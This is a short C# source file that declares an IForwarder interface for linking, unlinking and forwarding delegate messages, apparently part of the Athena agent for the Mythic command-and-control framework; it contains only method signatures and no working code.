using Athena.Models.Mythic.Tasks;
using Athena.Models.Responses;
using Athena.Models.Comms.SMB;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Athena.Models.Config
{
    public interface IForwarder
    {
        public string profile_type { get; }
        public abstract Task<bool> ForwardDelegateMessage(DelegateMessage dm);
        public abstract Task<bool> Unlink();
        public abstract Task<EdgeResponseResult> Link(MythicJob job, string uuid);
    }
}
